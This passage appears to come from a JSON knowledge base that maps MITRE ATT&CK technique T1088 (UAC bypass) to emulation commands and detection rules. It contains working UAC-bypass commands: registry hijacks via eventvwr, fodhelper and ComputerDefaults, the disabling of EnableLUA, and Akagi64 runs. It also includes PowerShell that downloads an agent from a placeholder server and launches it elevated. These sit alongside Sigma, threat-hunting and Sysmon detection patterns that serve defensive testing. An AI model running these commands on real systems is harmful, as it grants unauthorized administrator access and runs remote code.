(source), Daniil Yugoslavskiy (rule)", "date": "2019/06/03", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"ParentIntegrityLevel": "Medium", "IntegrityLevel": "System", "User": "NT AUTHORITY\\SYSTEM"}, "condition": "selection"}, "falsepositives": ["Unknown"], "level": "critical", "enrichment": ["EN_0001_cache_sysmon_event_id_1_info", "EN_0002_enrich_sysmon_event_id_1_with_parent_info"]}}]}, {"technique_id": "T1088", "commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "uacbypass", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "One of the following:\nexploit/windows/local/bypassuac\nexploit/windows/local/bypassuac_injection\nexploit/windows/local/bypassuac_vbs", "name": "Metasploit"}, {"source": "atomics/T1088/T1088.yaml", "command": "reg.exe add hkcu\\software\\classes\\mscfile\\shell\\open\\command /ve /d \"C:\\Windows\\System32\\cmd.exe\" /f\ncmd.exe /c eventvwr.msc\n", "name": null}, {"source": "atomics/T1088/T1088.yaml", "command": "New-Item \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force\nStart-Process \"C:\\Windows\\System32\\eventvwr.msc\"\n", "name": null}, {"source": "atomics/T1088/T1088.yaml", "command": "reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d \"C:\\Windows\\System32\\cmd.exe\" /f\nreg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f\nfodhelper.exe\n", "name": null}, {"source": "atomics/T1088/T1088.yaml", "command": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force\nStart-Process \"C:\\Windows\\System32\\fodhelper.exe\"\n", "name": null}, {"source": "atomics/T1088/T1088.yaml", "command": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force\nStart-Process \"C:\\Windows\\System32\\ComputerDefaults.exe\"\n", "name": null}, {"source": "atomics/T1088/T1088.yaml", "command": "mkdir \"\\\\?\\C:\\Windows \\System32\\\"\ncopy \"C:\\Windows\\System32\\cmd.exe\" \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"\nmklink c:\\testbypass.exe \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"\n", "name": null}, {"source": "data/abilities/privilege-escalation/665432a4-42e7-4ee1-af19-a9a8c9455d0c.yml", "command": {"windows": {"psh": {"command": "New-ItemProperty -Path HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system -Name EnableLUA -PropertyType DWord -Value 0 -Force\n"}}}, "name": "Set a registry key to allow UAC bypass"}, {"source": "data/abilities/privilege-escalation/95ad5d69-563e-477b-802b-4855bfb3be09.yml", "command": {"windows": {"cmd,psh": {"command": ".\\Akagi64.exe 30 C:\\Windows\\System32\\cmd.exe\n", "payloads": ["Akagi64.exe"]}}}, "name": "Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe"}, {"source": "data/abilities/privilege-escalation/b7344901-0b02-4ead-baf6-e3f629ed545f.yml", "command": {"windows": {"psh": {"command": ".\\Akagi64.exe 45 C:\\Windows\\System32\\cmd.exe\n", "payloads": ["Akagi64.exe"]}}}, "name": "executes the slui exe file handler hijack"}, {"source": "data/abilities/privilege-escalation/e3db134c-4aed-4c5a-9607-c50183c9ef9e.yml", "command": {"windows": {"psh": {"command": "$url=\"#{server}/file/download\"; $wc=New-Object System.Net.WebClient; $wc.Headers.add(\"platform\",\"windows\"); $wc.Headers.add(\"file\",\"sandcat.go\"); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\"); [io.file]::WriteAllBytes(\"C:\\Users\\Public\\$name.exe\",$data);\n$job = Start-Job -ScriptBlock { Import-Module -Name .\\Bypass-UAC.ps1; Bypass-UAC -Command \"C:\\Users\\Public\\$name.exe -group #{group}\"; };\nReceive-Job -Job $job -Wait;\n", "payloads": ["Bypass-UAC.ps1"]}}}, "name": "Bypass user account controls - medium"}, {"source": "data/abilities/privilege-escalation/e99cce5c-cb7e-4a6e-8a09-1609a221b90a.yml", "command": {"windows": {"psh": {"command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"sandcat.go\");\n$wc.Headers.add(\"server\",\"#{server}\");\n$wc.Headers.add(\"defaultSleep\",\"60\");\n$wc.Headers.add(\"defaultGroup\",\"bypassed_u_bro\");\n$data=$wc.DownloadData($url);\n$name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\");\n[io.file]::WriteAllBytes(\"C:\\Users\\Public\\$name.exe\",$data);\n.\\Akagi64.exe 32 \"C:\\Users\\Public\\$name.exe -server #{server}\"\n", "payloads": ["Akagi64.exe"]}}}, "name": "UIPI bypass with uiAccess application"}, {"source": "Threat Hunting Tables", "command": "eventvwr.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "HKEY_USERS\\*\\mscfile\\shell\\open\\command", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "eventvwr.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "mshta.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "verclsid.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "winword.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "verclsid.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "*.exe reg query", "name": null}, {"source": "Threat Hunting Tables", "command": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths", "name": "registry_path"}, {"source": "SysmonHunter - UAC bypass", "command": "Software\\Classes\\mscfile\\shell\\open\\command|mscfile\\shell\\open\\command", "name": null}, {"source": "SysmonHunter - UAC bypass", "command": "Software\\Classes\\mscfile\\shell\\open\\command|mscfile\\shell\\open\\command", "name": null}, {"source": "SysmonHunter - UAC bypass", "command": "\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe|\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand", "name": null}, {"source": "SysmonHunter - UAC bypass", "command": "\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe|\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand", "name": null}, {"source": "SysmonHunter - UAC bypass", "command": "\\Software\\Classes\\ms-settings\\shell\\open\\command", "name": null}, {"source": "SysmonHunter - UAC bypass", "command": "\\Software\\Classes\\ms-settings\\shell\\open\\command", "name": null}, {"source": "SysmonHunter - UAC bypass", "command": "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\cmmgr32.exe", "name": null}, {"source": "SysmonHunter - UAC bypass", "command": "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\cmmgr32.exe", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/ask", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/ask", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/bypassuac", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/bypassuac", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/bypassuac_eventvwr", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/bypassuac_eventvwr", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/bypassuac_wscript", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/bypassuac_wscript", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/bypassuac_env", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/bypassuac_env", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/bypassuac_fodhelper", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/bypassuac_fodhelper", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/bypassuac_sdctlbypass", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/bypassuac_sdctlbypass", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/bypassuac_tokenmanipulation", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/bypassuac_tokenmanipulation", "name": "Empire Module Command"}], "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1088", "Built-in Windows Command": "", "Cobalt Strike": "uacbypass", "Metasploit": "One of the following:\nexploit/windows/local/bypassuac\nexploit/windows/local/bypassuac_injection\nexploit/windows/local/bypassuac_vbs", "Description": "If you have a medium integrity process, but are an administrator, UACBypass will get you a high integrity process without prompting the user for confirmation."}}, {"Atomic Red Team Test - Bypass User Account Control": {"attack_technique": "T1088", "display_name": "Bypass User Account Control", "atomic_tests": [{"name": "Bypass UAC using Event Viewer (cmd)", "description": "Bypasses User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\nUpon execution command prompt should be launched with administrative privelages\n", "supported_platforms": ["windows"], "input_arguments": {"executable_binary": {"description": "Binary to execute with UAC Bypass", "type": "path", "default": "C:\\Windows\\System32\\cmd.exe"}}, "executor": {"name": "command_prompt", "command": "reg.exe add hkcu\\software\\classes\\mscfile\\shell\\open\\command /ve /d \"#{executable_binary}\" /f\ncmd.exe /c eventvwr.msc\n", "cleanup_command": "reg.exe delete hkcu\\software\\classes\\mscfile /f >nul 2>&1\n"}}, {"name": "Bypass UAC using Event Viewer (PowerShell)", "description": "PowerShell code to bypass User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\nUpon execution command prompt should be launched with administrative privelages\n", "supported_platforms": ["windows"], "input_arguments": {"executable_binary": {"description": "Binary to execute with UAC Bypass", "type": "path", "default": "C:\\Windows\\System32\\cmd.exe"}}, "executor": {"name": "powershell", "command": "New-Item \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Name \"(default)\" -Value \"#{executable_binary}\" -Force\nStart-Process \"C:\\Windows\\System32\\eventvwr.msc\"\n", "cleanup_command": "Remove-Item \"HKCU:\\software\\classes\\mscfile\" -force -Recurse -ErrorAction Ignore\n"}}, {"name": "Bypass UAC using Fodhelper", "description": "Bypasses User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.\nUpon execution, \"The operation completed successfully.\" will be shown twice and command prompt will be opened.\n", "supported_platforms": ["windows"], "input_arguments": {"executable_binary": {"description": "Binary to execute with UAC Bypass", "type": "path", "default": "C:\\Windows\\System32\\cmd.exe"}}, "executor": {"name": "command_prompt", "elevation_required": false, "command": "reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d \"#{executable_binary}\" /f\nreg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f\nfodhelper.exe\n", "cleanup_command": "reg.exe delete hkcu\\software\\classes\\ms-settings /f >nul 2>&1\n"}}, {"name": "Bypass UAC using Fodhelper - PowerShell", "description": "PowerShell code to bypass User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.\nUpon execution command prompt will be opened.\n", "supported_platforms": ["windows"], "input_arguments": {"executable_binary": {"description": "Binary to execute with UAC Bypass", "type": "path", "default": "C:\\Windows\\System32\\cmd.exe"}}, "executor": {"name": "powershell", "elevation_required": false, "command": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"#{executable_binary}\" -Force\nStart-Process \"C:\\Windows\\System32\\fodhelper.exe\"\n", "cleanup_command": "Remove-Item \"HKCU:\\software\\classes\\ms-settings\" -force -Recurse -ErrorAction Ignore\n"}}, {"name": "Bypass UAC using ComputerDefaults (PowerShell)", "description": "PowerShell code to bypass User Account Control using ComputerDefaults.exe on Windows 10\nUpon execution administrative command prompt should open\n", "supported_platforms": ["windows"], "input_arguments": {"executable_binary": {"description": "Binary to execute with UAC Bypass", "type": "path", "default": "C:\\Windows\\System32\\cmd.exe"}}, "executor": {"name": "powershell", "elevation_required": true, "command": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"#{executable_binary}\" -Force\nStart-Process \"C:\\Windows\\System32\\ComputerDefaults.exe\"\n", "cleanup_command": "Remove-Item \"HKCU:\\software\\classes\\ms-settings\" -force -Recurse -ErrorAction Ignore\n"}}, {"name": "Bypass UAC by Mocking Trusted Directories", "description": "Creates a fake \"trusted directory\" and copies a binary to bypass UAC. The UAC bypass may not work on fully patched systems\nUpon execution the directory structure should exist if the system is patched, if unpatched Microsoft Management Console should launch\n", "supported_platforms": ["windows"], "input_arguments": {"executable_binary": {"description": "Binary to execute with UAC Bypass", "type": "path", "default": "C:\\Windows\\System32\\cmd.exe"}}, "executor": {"name": "command_prompt", "elevation_required": true, "command": "mkdir \"\\\\?\\C:\\Windows \\System32\\\"\ncopy \"#{executable_binary}\" \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"\nmklink c:\\testbypass.exe \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"\n", "cleanup_command": "rd \"\\\\?\\C:\\Windows \\\" /S /Q >nul 2>nul\ndel \"c:\\testbypass.exe\" >nul 2>nul\n"}}]}}, {"Mitre Stockpile - Set a registry key to allow UAC bypass": {"description": "Set a registry key to allow UAC bypass", "id": "665432a4-42e7-4ee1-af19-a9a8c9455d0c", "name": "UAC bypass registry", "platforms": {"windows": {"psh": {"command": "New-ItemProperty -Path HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system -Name EnableLUA -PropertyType DWord -Value 0 -Force\n"}}}, "tactic": "privilege-escalation", "technique": {"attack_id": "T1088", "name": "Bypass User Account Control"}}}, {"Mitre Stockpile - Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe": {"id": "95ad5d69-563e-477b-802b-4855bfb3be09", "description": "Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe", "name": "wow64log DLL Hijack", "platforms": {"windows": {"cmd,psh": {"command": ".\\Akagi64.exe 30 C:\\Windows\\System32\\cmd.exe\n", "payloads": ["Akagi64.exe"]}}}, "tactic": "privilege-escalation", "technique": {"attack_id": "T1088", "name": "Bypass User Account Control"}}}, {"Mitre Stockpile - executes the slui exe file handler hijack": {"id": "b7344901-0b02-4ead-baf6-e3f629ed545f", "description": "executes the slui exe file handler hijack", "name": "Slui File Handler Hijack", "platforms": {"windows": {"psh": {"command": ".\\Akagi64.exe 45 C:\\Windows\\System32\\cmd.exe\n", "payloads": ["Akagi64.exe"]}}}, "tactic": "privilege-escalation", "technique": {"attack_id": "T1088", "name": "Bypass User Account Control"}}}, {"Mitre Stockpile - Bypass user account controls - medium": {"id": "e3db134c-4aed-4c5a-9607-c50183c9ef9e", "name": "Bypass UAC Medium", "description": "Bypass user account controls - medium", "tactic": "privilege-escalation", "technique": {"attack_id": "T1088", "name": "Bypass User Account Control"}, "platforms": {"windows": {"psh": {"command": "$url=\"#{server}/file/download\"; $wc=New-Object System.Net.WebClient; $wc.Headers.add(\"platform\",\"windows\"); $wc.Headers.add(\"file\",\"sandcat.go\"); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\"); [io.file]::WriteAllBytes(\"C:\\Users\\Public\\$name.exe\",$data);\n$job = Start-Job -ScriptBlock { Import-Module -Name .\\Bypass-UAC.ps1; Bypass-UAC -Command \"C:\\Users\\Public\\$name.exe -group #{group}\"; };\nReceive-Job -Job $job -Wait;\n", "payloads": ["Bypass-UAC.ps1"]}}}}}, {"Mitre Stockpile - UIPI bypass with uiAccess application": {"id": "e99cce5c-cb7e-4a6e-8a09-1609a221b90a", "description": "UIPI bypass with uiAccess application", "name": "duser/osksupport DLL Hijack", "platforms": {"windows": {"psh": {"command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"sandcat.go\");\n$wc.Headers.add(\"server\",\"#{server}\");\n$wc.Headers.add(\"defaultSleep\",\"60\");\n$wc.Headers.add(\"defaultGroup\",\"bypassed_u_bro\");\n$data=$wc.DownloadData($url);\n$name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\");\n[io.file]::WriteAllBytes(\"C:\\Users\\Public\\$name.exe\",$data);\n.\\Akagi64.exe 32 \"C:\\Users\\Public\\$name.exe -server #{server}\"\n", "payloads": ["Akagi64.exe"]}}}, "tactic": "privilege-escalation", "technique": {"attack_id": "T1088", "name": "Bypass User Account Control"}}}, {"Threat Hunting Tables": {"chain_id": "100012", "os": "windows", "parent_process": "eventvwr.exe", "commandline_string": "", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "HKEY_USERS\\*\\mscfile\\shell\\open\\command", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "bypass_uac", "mitre_attack": "T1088", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100024", "os": "windows", "parent_process": "eventvwr.exe", "commandline_string": "", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "bypass_uac", "mitre_attack": "T1088", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100047", "os": "windows", "parent_process": "mshta.exe", "commandline_string": "", "sub_process_1": "verclsid.exe", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "bypass_uac", "mitre_attack": "T1088", "itw_sample": "https://www.redcanary.com/blog/verclsid-exe-threat-detection/"}}, {"Threat Hunting Tables": {"chain_id": "100096", "os": "windows", "parent_process": "winword.exe", "commandline_string": "", "sub_process_1": "verclsid.exe", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "bypass_uac", "mitre_attack": "T1088", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100203", "os": "windows", "parent_process": "*.exe", "commandline_string": "reg query", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "bypass_uac", "mitre_attack": "T1088", "itw_sample": ""}}, {"SysmonHunter - T1088": {"name": "UAC bypass", "description": null, "level": "high", "phase": "Privilege Escalation", "query": [{"type": "reg", "reg": {"path": {"pattern": "Software\\Classes\\mscfile\\shell\\open\\command|mscfile\\shell\\open\\command"}}}, {"type": "process", "process": {"cmdline": {"pattern": "Software\\Classes\\mscfile\\shell\\open\\command|mscfile\\shell\\open\\command"}}}, {"type": "reg", "reg": {"path": {"pattern": "\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe|\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand"}}}, {"type": "process", "process": {"cmdline": {"pattern": "\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe|\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand"}}}, {"type": "reg", "reg": {"path": {"pattern": "\\Software\\Classes\\ms-settings\\shell\\open\\command"}}}, {"type": "process", "process": {"cmdline": {"pattern": "\\Software\\Classes\\ms-settings\\shell\\open\\command"}}}, {"type": "reg", "reg": {"path": {"pattern": "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\cmmgr32.exe"}}}, {"type": "process", "process": {"cmdline": {"pattern": "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\cmmgr32.exe"}}}]}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/privesc/ask", "ATT&CK Technique #1": "T1088", "ATT&CK Technique #2": "", "Technique": "Bypass User Account Control", "Concatenate for Python Dictionary": "\"powershell/privesc/ask\":  [\"T1088\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/privesc/bypassuac", "ATT&CK Technique #1": "T1088", "ATT&CK Technique #2": "", "Technique": "Bypass User Account Control", "Concatenate for Python Dictionary": "\"powershell/privesc/bypassuac\":  [\"T1088\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/privesc/bypassuac_eventvwr", "ATT&CK Technique #1": "T1088", "ATT&CK Technique #2": "", "Technique": "Bypass User Account Control", "Concatenate for Python Dictionary": "\"powershell/privesc/bypassuac_eventvwr\":  [\"T1088\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/privesc/bypassuac_wscript", "ATT&CK Technique #1": "T1088", "ATT&CK Technique #2": "", "Technique": "Bypass User Account Control", "Concatenate for Python Dictionary": "\"powershell/privesc/bypassuac_wscript\":  [\"T1088\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/privesc/bypassuac_env", "ATT&CK Technique #1": "T1088", "ATT&CK Technique #2": "", "Technique": "Bypass User Account Control", "Concatenate for Python Dictionary": "\"powershell/privesc/bypassuac_env\":  [\"T1088\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/privesc/bypassuac_fodhelper", "ATT&CK Technique #1": "T1088", "ATT&CK Technique #2": "", "Technique": "Bypass User Account Control", "Concatenate for Python Dictionary": "\"powershell/privesc/bypassuac_fodhelper\":  [\"T1088\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/privesc/bypassuac_sdctlbypass", "ATT&CK Technique #1": "T1088", "ATT&CK Technique #2": "", "Technique": "Bypass User Account Control", "Concatenate for Python Dictionary": "\"powershell/privesc/bypassuac_sdctlbypass\":  [\"T1088\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/privesc/bypassuac_tokenmanipulation", "ATT&CK Technique #1": "T1088", "ATT&CK Technique #2": "", "Technique": "Bypass User Account Control", "Concatenate for Python Dictionary": "\"powershell/privesc/bypassuac_tokenmanipulation\":  [\"T1088\"],"}}], "command_list": ["uacbypass", "One of the following:\nexploit/windows/local/bypassuac\nexploit/windows/local/bypassuac_injection\nexploit/windows/local/bypassuac_vbs", "reg.exe add hkcu\\software\\classes\\mscfile\\shell\\open\\command /ve /d \"C:\\Windows\\System32\\cmd.exe\" /f\ncmd.exe /c eventvwr.msc\n", "New-Item \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force\nStart-Process \"C:\\Windows\\System32\\eventvwr.msc\"\n", "reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d \"C:\\Windows\\System32\\cmd.exe\" /f\nreg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f\nfodhelper.exe\n", "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force\nStart-Process \"C:\\Windows\\System32\\fodhelper.exe\"\n", "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force\nStart-Process \"C:\\Windows\\System32\\ComputerDefaults.exe\"\n", "mkdir \"\\\\?\\C:\\Windows \\System32\\\"\ncopy \"C:\\Windows\\System32\\cmd.exe\" \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"\nmklink c:\\testbypass.exe \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"\n", {"windows": {"psh": {"command": "New-ItemProperty -Path HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system -Name EnableLUA -PropertyType DWord -Value 0 -Force\n"}}}, {"windows": {"cmd,psh": {"command": ".\\Akagi64.exe 30 C:\\Windows\\System32\\cmd.exe\n", "payloads": ["Akagi64.exe"]}}}, {"windows": {"psh": {"command": ".\\Akagi64.exe 45 C:\\Windows\\System32\\cmd.exe\n", "payloads": ["Akagi64.exe"]}}}, {"windows": {"psh": {"command": "$url=\"#{server}/file/download\"; $wc=New-Object System.Net.WebClient; $wc.Headers.add(\"platform\",\"windows\"); $wc.Headers.add(\"file\",\"sandcat.go\"); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\"); [io.file]::WriteAllBytes(\"C:\\Users\\Public\\$name.exe\",$data);\n$job = Start-Job -ScriptBlock { Import-Module -Name .\\Bypass-UAC.ps1; Bypass-UAC -Command \"C:\\Users\\Public\\$name.exe -group #{group}\"; };\nReceive-Job -Job $job -Wait;\n", "payloads": ["Bypass-UAC.ps1"]}}}, {"windows": {"psh": {"command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"sandcat.go\");\n$wc.Headers.add(\"server\",\"#{server}\");\n$wc.Headers.add(\"defaultSleep\",\"60\");\n$wc.Headers.add(\"defaultGroup\",\"bypassed_u_bro\");\n$data=$wc.DownloadData($url);\n$name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\");\n[io.file]::WriteAllBytes(\"C:\\Users\\Public\\$name.exe\",$data);\n.\\Akagi64.exe 32 \"C:\\Users\\Public\\$name.exe -server #{server}\"\n", "payloads": ["Akagi64.exe"]}}}, "eventvwr.exe", "HKEY_USERS\\*\\mscfile\\shell\\open\\command", "eventvwr.exe", "mshta.exe", "verclsid.exe", "winword.exe", "verclsid.exe", "*.exe reg query", "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths", "Software\\Classes\\mscfile\\shell\\open\\command|mscfile\\shell\\open\\command", "Software\\Classes\\mscfile\\shell\\open\\command|mscfile\\shell\\open\\command", "\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe|\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand", 